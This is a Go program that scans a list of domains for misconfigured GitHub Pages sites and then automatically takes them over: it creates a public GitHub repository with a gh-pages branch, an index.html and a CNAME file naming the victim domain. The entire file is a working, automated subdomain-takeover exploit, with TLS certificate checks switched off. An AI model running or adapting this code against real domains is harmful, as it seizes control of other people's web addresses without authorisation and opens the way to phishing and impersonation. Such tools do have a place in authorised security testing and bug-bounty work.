package main

import (
	"bufio"
	"crypto/tls"
	"fmt"
	"io/ioutil"
	"log"
	"net"
	"net/http"
	"os"
	"regexp"
	"time"

	"github.com/anshumanbh/go-github/github"
	"github.com/subosito/gotenv"
	"golang.org/x/oauth2"
)

func main() {

	gotenv.Load()

	filepath := os.Args[1]

	f, err := os.Open(filepath)

	if err != nil {
		log.Fatalln(err)
	}

	defer f.Close()

	scanner := bufio.NewScanner(f)

	for scanner.Scan() {
		domain := scanner.Text()

		fmt.Println(IsReachable(domain))
	}

}

func IsReachable(domain string) string {
	ch := make(chan string, 1)
	go func() {
		select {
		case ch <- check(domain):
		case <-time.After(5 * time.Second):
			ch <- "timedout"
		}
	}()
	return <-ch
}

func check(domain string) string {
	tr := &http.Transport{
		Dial: (&net.Dialer{
			Timeout: 5 * time.Second,
		}).Dial,
		TLSHandshakeTimeout: 5 * time.Second,
		TLSClientConfig:     &tls.Config{InsecureSkipVerify: true},
	}

	timeout := time.Duration(5 * time.Second)
	client := &http.Client{
		Transport: tr,
		Timeout:   timeout,
	}

	response, err := client.Get("https://" + domain)
	if err != nil {
		fmt.Println("")
		return "Can't reach the domain " + domain
	}

	text, err := ioutil.ReadAll(response.Body)
	if err != nil {
		log.Fatal(err)
		return "Trouble reading response"
	}

	cantakeovermatchgithub1, _ := regexp.MatchString("There isn't a GitHub Pages site here.", string(text))
	cantakeovermatchgithub2, _ := regexp.MatchString("For root URLs (like http://example.com/) you must provide an index.html file", string(text))

	if cantakeovermatchgithub1 {
		fmt.Println("")
		return githubcreate(domain)
	} else if cantakeovermatchgithub2 {
		fmt.Println("")
		return githubcreate(domain)
	} else {
		fmt.Println("")
		return domain + " Not found"
	}
}

func githubcreate(domain string) string {

	ts := oauth2.StaticTokenSource(&oauth2.Token{AccessToken: os.Getenv("token")})
	tc := oauth2.NewClient(oauth2.NoContext, ts)
	client := github.NewClient(tc)

	repo := &github.Repository{
		Name:            github.String(domain),
		Description:     github.String("testing subdomain takeovers"),
		Private:         github.Bool(false),
		LicenseTemplate: github.String("mit"),
	}

	repocreate, _, err := client.Repositories.Create("", repo)
	if _, ok := err.(*github.RateLimitError); ok {
		log.Println("hit rate limit")
	}

	reponame := *repocreate.Name
	ownername := *repocreate.Owner.Login
	refURL := *repocreate.URL
	ref := "refs/heads/master"

	SHAvalue, _, err := client.Repositories.GetCommitSHA1(ownername, reponame, ref, "")
	if _, ok := err.(*github.RateLimitError); ok {
		log.Println("hit rate limit")
	}

	opt := &github.Reference{
		Ref: github.String("refs/heads/gh-pages"),
		URL: github.String(refURL + "/git/refs/heads/gh-pages"),
		Object: &github.GitObject{
			SHA: github.String(SHAvalue),
		},
	}

	newref, _, err := client.Git.CreateRef(ownername, reponame, opt)
	if _, ok := err.(*github.RateLimitError); ok {
		log.Println("hit rate limit")
	}

	Indexpath := "index.html"
	CNAMEpath := "CNAME"
	data := "This domain is temporarily suspended"

	indexfile := &github.RepositoryContentFileOptions{
		Message: github.String("Adding the index.html page"),
		Content: []byte(data),
		Branch:  github.String("gh-pages"),
	}

	newfile1, _, err := client.Repositories.CreateFile(ownername, reponame, Indexpath, indexfile)
	if _, ok := err.(*github.RateLimitError); ok {
		log.Println("hit rate limit")
	}

	cnamefile := &github.RepositoryContentFileOptions{
		Message: github.String("Adding the subdomain to takeover to the CNAME file"),
		Content: []byte(domain),
		Branch:  github.String("gh-pages"),
	}

	newfile2, _, err := client.Repositories.CreateFile(ownername, reponame, CNAMEpath, cnamefile)
	if _, ok := err.(*github.RateLimitError); ok {
		log.Println("hit rate limit")
	}

	fmt.Println("Found: Misconfigured Github Page at " + domain)
	fmt.Println("Trying to take over this domain now..Please wait for a few seconds")
	fmt.Println("Branch created at " + *newref.URL)
	fmt.Println("Index File created at " + *newfile1.URL)
	fmt.Println("CNAME file created at " + *newfile2.URL)

	return "Please check " + domain + " after a few minutes to ensure that it has been taken over.."

}
